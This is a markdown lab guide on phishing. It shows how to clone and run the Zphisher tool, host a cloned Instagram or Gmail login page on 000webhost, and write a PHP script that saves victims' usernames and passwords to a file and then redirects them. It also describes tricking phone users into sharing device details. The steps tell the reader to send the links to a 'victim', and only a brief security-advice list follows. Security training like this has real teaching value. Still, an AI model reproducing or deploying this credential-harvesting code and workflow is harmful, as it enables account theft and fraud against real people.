# 🎣 Phishing & Mobile OS Information Gathering – Zphisher & Termux

## 🎯 Objective  
Simulate phishing attacks using pre-built templates with Zphisher, and gather mobile device metadata through social engineering. Understand how attackers craft believable phishing pages and capture credentials.

---

## 🛠️ Tools Used  
- Zphisher (GitHub phishing tool)  
- 000webhost (hosted phishing site)  
- Termux / iSH (mobile info gathering)  
- Firefox / Browser  
- Kali Linux / Android Phone

---

## 🎯 A. Launch a Phishing Page (Zphisher)

### 🔧 Steps:

1. Clone and install Zphisher:
```bash
git clone https://github.com/htr-tech/zphisher
cd zphisher
bash zphisher.sh
```

2. Choose a phishing template:
- Facebook, Instagram, Gmail, LinkedIn, etc.

3. Select a hosting method:
- Use localhost or NGROK to expose public link

4. Copy and send the generated phishing link to a victim

🧠 **Result**: When the victim enters credentials, Zphisher captures and displays them.

---

## 🧪 B. Host a Phishing Site on 000webhost

1. Create a free 000webhost account  
2. Upload a cloned login page (e.g., fake Instagram or Gmail)  
3. Modify `login.php` to POST to `POST.php`  
4. Create a `POST.php` file to capture form data:

```php
<?php
file_put_contents("credentials.txt", "USER: " . $_POST['username'] . " | PASS: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com'); // Redirect after login
exit();
?>
```

5. Upload both files and share the link

6. View captured credentials:
```
credentials.txt
```

---

## 📱 C. Mobile OS Info Gathering – Termux & iSH

### Termux (Android):
```bash
pkg update && pkg upgrade
pkg install neofetch
neofetch
```

### iSH (iOS Terminal Emulator):
```bash
apk update && apk add neofetch
neofetch
```

🧠 **Use:** Trick users into pasting device output (platform, CPU, kernel, etc.)  
💡 Often used to estimate device capabilities or deliver specific exploits

---

## 🧠 Key Concepts

- **Phishing** leverages trust and urgency  
- **Credential harvesting** via cloned sites is highly effective  
- **Mobile info gathering** supports fingerprinting and tracking  
- Zphisher automates the setup but still requires social engineering skill

---

## 📸 Recommended Screenshots

Save inside `phishing-social-engineering/screenshots/`:

- `zphisher-ui.png` → Tool running in terminal  
- `phishing-page.png` → Screenshot of fake login form  
- `captured-creds.png` → Terminal showing intercepted credentials  
- `000webhost-upload.png` → Hosting the phishing files  
- `mobile-neofetch.png` → Neofetch output from phone

---

## 🛡️ Security Advice

- Always check the URL before logging in  
- Avoid clicking unknown shortened links  
- Use MFA to protect against credential theft  
- Educate users on how phishing looks and works  
- Monitor endpoints for unauthorized info sharing
